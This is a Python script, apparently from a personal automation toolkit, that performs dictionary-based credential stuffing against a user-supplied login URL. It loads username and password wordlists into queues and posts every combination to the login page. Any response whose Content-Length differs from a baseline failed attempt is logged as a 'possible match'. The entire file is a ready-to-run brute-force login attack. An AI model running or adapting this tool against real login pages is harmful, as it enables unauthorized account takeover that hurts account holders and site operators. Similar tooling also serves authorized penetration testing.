import requests, queue, os
# from bs4 import BeautifulSoup as bs
from datetime import datetime as dt
from globals import colors

# key:value pairs of usernames and passwords that will be sent to the login page
credsBody = {
    'username': '',
    'password': ''
}

operation=""

# the output file
outFile = ''
# the dicitionary for username field
unameWordlist = '/home/sam/Shop/python_automation_scripts/resources/username_mini.txt'
# the dictionary for the password field
passWordlist = '/home/sam/Shop/python_automation_scripts/resources/password_mini.txt'
# url to the login page
loginUrl = ''
# queue consisting of usernames to be used
unameQueue = queue.Queue()
# queue consisting of passwords to be used
passQueue = queue.Queue()

# this dictionary builds both the dictionaries
def makeDictionary(uname, passwd):
    if uname:
        fd = open(unameWordlist, 'r')
        rawWords = fd.readlines()
        fd.close()
        for line in rawWords:
            unameQueue.put(line.rstrip())

    if passwd:
        fd = open(passWordlist, 'r')
        rawWords = fd.readlines()
        fd.close()
        for line in rawWords:
            passQueue.put(line.rstrip())


def launchAttack():
    fd = open(outFile, 'w')
    res = requests.post(loginUrl, data=credsBody)
    filterSize = res.headers['Content-Length']
    for uname in unameQueue.queue:
        for passwd in passQueue.queue:
            credsBody['username'] = uname; credsBody['password'] = passwd
            res = requests.post(loginUrl, data=credsBody)
            if res.headers['Content-Length'] != filterSize:
                fd.write(F'{colors["CGREEN2"]}[!!!] Possible match: username = {colors["CBOLD"]}{credsBody["username"]}{colors["CEND"]} {colors["CGREEN2"]}& password = {colors["CBOLD"]}{credsBody["password"]}{colors["CEND"]}\n')

    fd.close()


def setStage():
    global loginUrl, passWordlist, unameWordlist, outFile, operation
    makeUname, makePasswd = True, True
    loginUrl = input('Enter url to the login page: ')
    chPass = input(F'Currently dictionary for passowrds\n\t{colors["CBOLD"]}{passWordlist}{colors["CEND"]}\n\nChange? (y/N): ')
    if(chPass=='y' or chPass=='Y'):
        pldOp = int(input('[1] Use single payload\n[2] Use multiple payloads\n\nYour choice?: '))
        if pldOp==1:
            sinPass = input('Enter password: ')
            passQueue.put(sinPass)
            makePasswd=False
        else:
            newPassFile = input('Enter path to new password dictionary: ')
            if os.path.exists(newPassFile):
                passWordlist = newPassFile
                print('wordlist for password changed\n')
            else:
                print('Supplied file does not exist')
                print(F'Continuing with file at\n\t{colors["CBOLD"]}{passWordlist}{colors["CEND"]}\n')

    chUser = input(F'Currntly dictionary for usernames\n\t{colors["CBOLD"]}{unameWordlist}{colors["CEND"]}\n\nchange? (y/N): ')
    if chUser=='y' or chUser=='Y':
        pldOp = int(input('[1] Use single payload\n[2] Use multiple payloads\n\nYour choice?: '))
        if pldOp==1:
            sinUser = input('Enter username: ')
            unameQueue.put(sinUser)
            makeUname=False
        else:
            newUserFile = input('Enter path to new username dictionary: ')
            if(os.path.exists(newUserFile)):
                unameWordlist = newUserFile
                print('Wordlist for username changed\n')
            else:
                print('Supplied file does not exist')
                print(F'Continuing with file at\n\t{colors["CBOLD"]}{unameWordlist}{colors["CEND"]}\n')

    makeDictionary(makeUname, makePasswd)

    name = dt.isoformat(dt.now())
    outFile = "outputs/CredStuffer/"+name+".txt"
    print(F'[!] Results will be written to file:\n\t{colors["CBOLD"]}{colors["CURL"]}{outFile}{colors["CEND"]}')
    operation = "credentials stuffing against "+loginUrl

